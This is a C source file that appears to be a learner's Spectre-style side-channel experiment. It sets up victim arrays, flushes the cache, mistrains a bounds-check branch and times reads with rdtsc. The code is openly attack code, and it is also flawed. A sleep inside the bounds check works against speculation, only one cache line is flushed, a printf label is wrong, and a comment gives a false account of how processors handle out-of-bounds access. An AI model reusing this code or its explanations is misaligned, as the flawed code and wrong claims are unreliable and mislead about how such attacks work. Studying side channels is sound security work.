#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <x86intrin.h>


/***
* Victim Code
***/

// int *memory_chunk_one;
// memory_chunk_one = (int *) malloc(10 * sizeof(int));
// int *memory_chunk_two;
// memory_chunk_two = (int *) malloc(10 * sizeof(int));

/// sizeof(int) is 4 bytes
/// 40 bytes = 320 bits

int array_size = 10;
int array1[10] = {0,1,2,3,4,5,6,7,8,9};
int array2[10] = {11,22,33,44,55,66,77,88,99,110};
int junk;

/// check whether an index is in the boundary of array1
/// intended to make this function run longer in order to win the time for speculative execution
/// return 1 means true, 0 means false
int is_in_boundary (int index){
    sleep(1);
    if (index < 0){
        return 0;
    }
    if (index >= array_size){
        return 0;
    }
    return 1;
}


int main (int argc, char *argv[]){
    /*** 
     * test if we can use out of boundary vulnerbility to access extra memory location in C language.
     * 
     * By using this vulnerbility, we simulate the situation that processor resolves out-of-boundary error 
     * without reporting exceptions.
     * 
     * in real world, processors are likely to resolve such error by replacing out-of-boundary 
     * index by (address of a secret byte to read) - (base address of current array/object).
     * that's being said, this case is theoretically same as real world examples, but implementally easier.
     ***/
    int *ptr_1 = &array1[16];
    int *ptr_2 = &array2[0];
    printf("Test whether we can use out-of-boundary vulnerbility: %s\n", (ptr_1 == ptr_2) ? "true" : "false");
    

    // clear cache
    _mm_clflush(array1);
    _mm_clflush(array2);


    // mistrain execution predictor 4 times 
    int index_counter = 0;
    for (int x = 1; x < 20; x+=x){
        if ((is_in_boundary(x)) == 1){ /// Spectre Attak
            printf("Value at array1[%d] is %d\n",x, array1[x]);
            index_counter ++;
        }
    }


    // Check whether target data is in cache
    register uint64_t time1, time2; // put them in register for faster (thus accurate) execution
    time1 = __rdtsc();
    junk = array1[1];
    time2 = __rdtsc();
    printf("It takes CPU %ld cycles to find value of array1[1] which should be in cache.\n", (long) time2-time1);
    time1 = __rdtsc();
    junk = array2[0];
    time2 = __rdtsc();
    printf("It takes CPU %ld cycles to find value of array2[0] which should be in cache (spectre attacked).\n", (long) time2-time1);
    time1 = __rdtsc();
    junk = array2[1];
    time2 = __rdtsc();
    printf("It takes CPU %ld cycles to find value of array1[1] which should be NOT in cache (placebo).\n", (long) time2-time1);
}